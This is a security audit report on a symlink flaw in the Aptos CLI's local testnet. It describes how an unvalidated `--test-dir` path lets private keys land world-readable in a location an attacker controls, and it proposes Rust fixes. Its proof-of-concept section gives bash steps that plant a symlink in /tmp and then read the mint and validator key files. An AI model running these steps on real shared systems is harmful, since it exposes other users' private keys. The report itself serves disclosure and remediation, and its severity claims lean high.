# Audit Report

## Title
Symlink Attack on Local Testnet Key Material Storage Leading to Private Key Exposure

## Summary
The `NodeManager` struct accepts a user-controlled `test_dir` PathBuf without validating for symlinks or canonicalizing the path. This allows attackers to redirect validator private keys and root keys to world-writable locations (e.g., `/tmp`) where they are written with weak permissions (0644), enabling unauthorized access to cryptographic key material.

## Finding Description

The vulnerability exists in the local testnet initialization flow where the `test_dir` parameter flows from user input to key material storage without proper validation.

**Attack Flow:**

1. The `get_derived_test_dir()` function accepts user input from the `--test-dir` CLI argument and returns it directly without validation: [1](#0-0) 

The function returns the user-provided path at line 506 without any symlink checks, canonicalization, or ownership verification.

2. This unvalidated path is passed to `NodeManager::new()` which stores it in the `test_dir` field: [2](#0-1) 

3. The path is then used to write sensitive cryptographic material. In `create_single_node_test_config()`, the root/mint private key is written directly: [3](#0-2) 

4. Additionally, validator identity keys (including consensus private keys) are written via `write_yaml()`: [4](#0-3) 

The `write_yaml()` function uses `File::create()` without setting restrictive permissions: [5](#0-4) 

**Exploitation Scenario:**

```bash
# Attacker creates symlink in shared environment
ln -s /tmp/attacker_controlled /tmp/victim_testnet

# Victim runs localnet
aptos node run-localnet --test-dir /tmp/victim_testnet

# Keys are now written to /tmp/attacker_controlled/ with 0644 permissions
# Attacker can read:
# - /tmp/attacker_controlled/mint.key (root private key)
# - /tmp/attacker_controlled/0/validator-identity.yaml (consensus keys)
# - /tmp/attacker_controlled/0/private-identity.yaml (network keys)
```

This breaks the **Cryptographic Correctness** invariant: private keys must be protected from unauthorized access.

## Impact Explanation

**Severity: High** (per Aptos Bug Bounty criteria for "Significant protocol violations")

**Impacted Assets:**
- Validator consensus private keys (used for block signing)
- Root/mint private keys (control over test funds)
- Validator network identity keys

**Security Impact:**
1. **Key Material Exposure**: Private keys are written with world-readable permissions (0644) to attacker-controlled locations
2. **Validator Impersonation**: Attacker can use stolen consensus keys to impersonate validators in the testnet
3. **Unauthorized Fund Access**: Root key exposure allows minting and transferring test funds
4. **Trust Violation**: Users expect the CLI to handle key material securely

**Real-World Attack Surfaces:**
- Multi-user development servers
- CI/CD environments with shared runners
- Containerized testing environments with mounted volumes
- University/corporate shared computing resources

While this affects "only" local testnet keys (not production), the impact is significant because:
- Developers may reuse patterns in production code
- Test environments in CI/CD may contain sensitive configuration
- Compromised test keys can be used to disrupt development workflows
- The vulnerability represents a fundamental security design flaw

## Likelihood Explanation

**Likelihood: Medium to High**

**Attack Complexity: Low**
- Attacker only needs permission to create symlinks
- No special privileges required
- Attack is entirely passive (no active exploitation needed)

**Prerequisites:**
- Shared system access (common in dev/CI environments)
- Ability to predict or influence victim's `--test-dir` path
- Victim must run `aptos node run-localnet` with attacker-controlled path

**Realistic Scenarios:**
1. **CI/CD Pipeline**: Runner uses predictable paths in `/tmp` or workspace directories
2. **Shared Dev Server**: Multiple developers on same system, one creates malicious symlinks
3. **Docker/Container**: Mounted volumes with symlinks from host
4. **Documentation/Tutorials**: If documentation suggests using `/tmp` for testing

The vulnerability is **easy to exploit** but requires the attacker to have some level of system access, making it Medium-High likelihood in realistic shared environments.

## Recommendation

**Immediate Fixes:**

1. **Canonicalize paths before use** in `get_derived_test_dir()`:

```rust
pub fn get_derived_test_dir(input_test_dir: &Option<PathBuf>) -> Result<PathBuf> {
    let global_config = GlobalConfig::load().context("Failed to load global config")?;
    let test_dir = match input_test_dir {
        Some(test_dir) => test_dir.clone(),
        None => global_config
            .get_config_location(ConfigSearchMode::CurrentDirAndParents)?
            .join(TESTNET_FOLDER),
    };
    
    // Canonicalize to resolve symlinks and verify path
    let canonical_path = test_dir.canonicalize()
        .or_else(|_| {
            // If path doesn't exist yet, canonicalize parent and append last component
            let parent = test_dir.parent()
                .ok_or_else(|| anyhow!("Invalid test directory path"))?;
            let parent_canonical = parent.canonicalize()
                .context("Failed to canonicalize parent directory")?;
            Ok(parent_canonical.join(test_dir.file_name().unwrap()))
        })?;
    
    // Verify the path is not in world-writable directories
    if canonical_path.starts_with("/tmp") || canonical_path.starts_with("/var/tmp") {
        return Err(anyhow!(
            "Test directory cannot be in world-writable locations like /tmp. \
             Please choose a secure location in your home directory."
        ));
    }
    
    Ok(canonical_path)
}
```

2. **Set restrictive permissions on key files** in `write_yaml()` and when creating mint.key:

```rust
use std::os::unix::fs::PermissionsExt;

fn write_yaml<T: Serialize>(path: &Path, object: &T) -> anyhow::Result<()> {
    let mut file = File::create(path)?;
    file.write_all(serde_yaml::to_string(object)?.as_bytes())?;
    
    // Set restrictive permissions (0600 - owner read/write only)
    #[cfg(unix)]
    {
        let metadata = file.metadata()?;
        let mut permissions = metadata.permissions();
        permissions.set_mode(0o600);
        std::fs::set_permissions(path, permissions)?;
    }
    
    Ok(())
}
```

3. **Verify directory ownership** before writing keys to ensure the directory is owned by the current user.

## Proof of Concept

**Setup (as attacker on shared system):**
```bash
#!/bin/bash
# Create attacker-controlled directory
mkdir -p /tmp/attacker_keys
chmod 755 /tmp/attacker_keys

# Create symlink in predictable location
ln -s /tmp/attacker_keys /tmp/victim_testnet

echo "Trap set. Waiting for victim to run: aptos node run-localnet --test-dir /tmp/victim_testnet"
```

**Victim runs:**
```bash
aptos node run-localnet --test-dir /tmp/victim_testnet
```

**Attacker exploitation:**
```bash
#!/bin/bash
# After victim runs the command, check for keys
ls -la /tmp/attacker_keys/

# Expected output:
# -rw-r--r-- 1 victim users ... mint.key
# drwxr-xr-x 2 victim users ... 0/

# Read the mint key (world-readable due to default umask)
cat /tmp/attacker_keys/mint.key | base64

# Read validator consensus keys
cat /tmp/attacker_keys/0/validator-identity.yaml
cat /tmp/attacker_keys/0/private-identity.yaml

echo "Private keys successfully extracted!"
```

**Verification:**
```bash
# Verify file permissions
stat -c "%a %n" /tmp/attacker_keys/mint.key
# Output: 644 /tmp/attacker_keys/mint.key
# (World-readable!)

# Verify symlink was followed
readlink /tmp/victim_testnet
# Output: /tmp/attacker_keys
```

The attacker can now read all private keys due to world-readable permissions and symlink following.

## Notes

This vulnerability is particularly concerning because:
1. The local testnet is likely used in CI/CD pipelines where environment isolation may be weak
2. Developers may not realize that CLI tools handle sensitive cryptographic material
3. The default behavior silently follows symlinks without warning
4. No security documentation warns about this risk

The fix requires both path validation (canonicalization, ownership checks) and proper file permissions (0600 for all key material).

### Citations

**File:** crates/aptos/src/node/local_testnet/mod.rs (L503-511)
```rust
pub fn get_derived_test_dir(input_test_dir: &Option<PathBuf>) -> Result<PathBuf> {
    let global_config = GlobalConfig::load().context("Failed to load global config")?;
    match input_test_dir {
        Some(test_dir) => Ok(test_dir.clone()),
        None => Ok(global_config
            .get_config_location(ConfigSearchMode::CurrentDirAndParents)?
            .join(TESTNET_FOLDER)),
    }
}
```

**File:** crates/aptos/src/node/local_testnet/node.rs (L86-91)
```rust
#[derive(Clone, Debug)]
pub struct NodeManager {
    config: NodeConfig,
    test_dir: PathBuf,
    no_node: bool,
}
```

**File:** aptos-node/src/lib.rs (L618-622)
```rust
    // Write the mint key to disk
    let serialized_keys = bcs::to_bytes(&root_key)?;
    let mut key_file = fs::File::create(aptos_root_key_path)?;
    key_file.write_all(&serialized_keys)?;

```

**File:** crates/aptos-genesis/src/builder.rs (L144-148)
```rust
            // Write identities in files
            write_yaml(val_identity_file.as_path(), &validator_identity)?;
            write_yaml(vfn_identity_file.as_path(), &vfn_identity)?;
            write_yaml(private_identity_file.as_path(), &private_identity)?;
            write_yaml(public_identity_file.as_path(), &public_identity)?;
```

**File:** crates/aptos-genesis/src/builder.rs (L418-421)
```rust
fn write_yaml<T: Serialize>(path: &Path, object: &T) -> anyhow::Result<()> {
    File::create(path)?.write_all(serde_yaml::to_string(object)?.as_bytes())?;
    Ok(())
}
```
